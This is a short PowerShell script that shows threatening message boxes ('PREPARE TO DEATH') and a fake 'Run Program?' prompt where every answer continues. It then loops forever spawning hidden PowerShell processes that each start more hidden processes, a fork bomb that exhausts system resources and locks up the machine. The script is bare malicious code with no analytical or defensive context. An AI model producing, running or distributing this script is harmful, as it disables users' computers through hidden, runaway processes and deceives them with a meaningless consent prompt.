{
[System.Reflection.Assembly]::LoadWithPartialName(“System.Windows.Forms”)
[Windows.Forms.MessageBox]::Show(“PREPARE TO DEATH”, “HAHAHAHAHAHAHAHA”, [Windows.Forms.MessageBoxButtons]::OK, [Windows.Forms.MessageBoxIcon]::Information)
[void][System.Reflection.Assembly]::LoadWithPartialName(‘Microsoft.VisualBasic’) 
$result = [Microsoft.VisualBasic.Interaction]::MsgBox(“Run Program?”, ‘YesNoCancel,Question’, “Information Extraction”) 
switch ($result) {
‘Yes’ { “Continue” }
'No' { "Continue" }
'Cancel' { "Continue" }
}
}
Do {
    start powershell -windowstyle hidden { start-process powershell.exe -WindowStyle hidden
}
}
Until ($x -eq $true)